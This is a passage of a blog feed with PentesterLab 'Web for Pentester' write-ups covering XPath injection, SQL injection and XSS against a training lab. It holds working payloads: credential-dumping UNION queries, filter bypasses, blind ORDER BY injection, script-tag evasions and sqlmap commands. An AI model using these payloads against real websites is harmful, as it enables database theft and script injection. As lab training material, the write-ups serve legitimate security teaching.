</span></code></pre></td></tr></table></div></figure>


<p>From the source code above, we know that variable $_GET[&lsquo;name&rsquo;] has no input validation and can be used to inject evil code.</p>

<p>In order to dump all the users' credentials, I use the payload &ldquo;<font color="red">&lsquo; or 1=1]%00</font>&rdquo; to construct the variable $xpath as follows:</p>

<p><code>users/user/name[.='' or 1=1]%00']/parent::*/message</code></p>

<p>Here <strong><em>%00</em></strong> will get rid of the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xml/example2.php?name=' or 1=1]%00</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - SQL Injection]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/"/>
    <updated>2015-05-22T05:53:28-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on SQL Injection attack. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>   
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>There is no input validation on parameter <em>$_GET[&ldquo;name&rdquo;]</em>, so I can exploit it directly with the injection payload: <code>' or 1=1-- -</code>. After injection, the variable <em>$sql</em> will become <code>SELECT * FROM users where name='' or 1=1-- -'</code> which will return all the entries in table users.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner</code></p>

<h2>Example 2</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/ /&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR NO SPACE&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>From the source code above, we know that the developer filtered SPACE in user input. However we can use comment /**/ or TAB/HT (%09, URL encoded) to bypass space filter.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example2.php?name=root'%09and%09'1'='1</code></p>

<p><code>http://10.10.10.129/sqli/example2.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/webforpentester_sqli/1.png"></p>

<p>SQLMAP exploit:
In sqlmap, we can set parameter &ldquo;<em><font color="red">&ndash;tamper=space2comment</font></em>&rdquo; to replace space with comment.</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example2.php?name=root" --dbs --tamper=space2comment</code></p>

<h2>Example 3</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/\s+/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR NO SPACE&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the developer use <a href="http://php.net/manual/en/regexp.reference.escape.php">PCRE regex (<strong><em>\s+</em></strong>)</a> to filter one or more sequential spaces (which including TAB/HT). However, I still can use comment <code>/**/</code> to bypass this filter.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example3.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example3.php?name=root" --dbs --tamper=space2comment</code></p>

<h2>Example 4</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="nv">$sql</span><span class="o">=</span><span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span><span class="o">.=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the developer use function &ldquo;<em><a href="http://php.net/manual/en/function.mysql-real-escape-string.php">mysql_real_escape_string</a></em>&rdquo; to prevent SQL injection from the following characters <code>\x00, \n, \r, \, ', " and \x1a</code></p>

<p>However, in this case, &lsquo;id&rsquo; is used as integrate number which is not quoted by <code>'</code>, it is still vulnerable to SQL injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example4.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example4.php?id=2" --dbs</code></p>

<h2>Example 5</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[0-9]+/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>&ldquo;I guess the beginning of the story &hellip;&hellip; But I didn&rsquo;t expect the end of the story.&rdquo; &ndash; Shakespeare</p>

<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is start from integrate number but it could be followed by everything.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example5.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example5.php?id=2" --dbs</code></p>

<h2>Example 6</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is end by integrate number but the injection still happened.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example6.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example6.php?id=2" --dbs</code></p>

<h2>Example 7</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^-?[0-9]+$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">];</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the beginning and the end of the string are correctly checked but due to the regular expression contains the <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE_MULTILINE modifier (m)</a>, it makes the regex filter can be bypassed only match one line, does not matter the start or the end. So the SQL injection still happened in following ways.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2%0a or 1=1</code></p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2 or 123=%0a123</code></p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2 or %0a123=%0a123</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example7.php?id=2%0a*" --dbs</code></p>

<h2>Example 8</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users ORDER BY `&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>From the source code above, we need to inject payload into &ldquo;<em>order by</em>&rdquo; statement. Due to the function &ldquo;<em>extractvalue</em>&rdquo; does not work here, the error information will not display, I have to choose <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">Time-based blind injection</a>.</p>

<p>PoC:</p>

<p>// the page will delay 5 seconds, it means the first character of database() is &lsquo;e&rsquo;
<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 101)%23`</p>

<p>// the page will display immediately, it means the first character of database() is not &lsquo;f&rsquo;
<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 102)%23`</p>

<p>Here I use mysql default null table <a href="http://en.wikipedia.org/wiki/DUAL_table">DUAL</a> to construct the payload.</p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example8.php?order=id%60*" --dbs --batch</code></p>

<h2>Example 9</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">...</span> <span class="o">...</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users ORDER BY &quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">]);</span>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to there is no back-tick (`), we have more options to exploit &ldquo;ORDER BY&rdquo; injection. rather than time-based blind injection, we can use <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#function_if">IF function</a> to construct error-based injection here.</p>

<p>PoC:</p>

<p>// the page will order by name, it means the first character of database() is &lsquo;e&rsquo;
<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=101),name,age)</code></p>

<p>// the page will order by age, it means the first character of database() is not &lsquo;f&rsquo;
<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=102),name,age)</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example9.php?order=id" --dbs --batch</code></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - XSS]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/"/>
    <updated>2015-05-21T07:11:45-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on Cross Site Script attack which is well known as XSS. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">Hello </span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>There is no input validation, so I can exploit it directly with the classic &ldquo;<font color="red"><em>alert(1)</em></font>&rdquo; injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example1.php?name=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>

<h2>Example 2</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello </span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>From the source code above, the developer filtered <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. This is a sort of black list technique but only avoid one very specific situation. It can be bypassed easily by using upper letters or recursion. for example, both <code>&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code> and <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> are working perfectly.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code></p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 3</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello </span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the developer use PCRE modifier &ldquo;i&rdquo; (<em>PCRE_CASELESS</em>) to match both upper and lower case letters. However, recursion method still works fine.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 4</h2>

<figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
